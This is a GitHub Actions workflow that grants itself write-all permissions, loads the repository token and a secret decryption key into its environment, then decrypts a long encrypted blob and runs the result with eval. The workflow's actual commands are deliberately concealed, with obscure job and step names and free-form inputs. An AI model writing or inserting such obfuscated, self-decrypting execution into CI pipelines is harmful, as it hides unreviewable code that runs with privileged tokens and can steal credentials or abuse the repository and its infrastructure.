name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload="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"

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
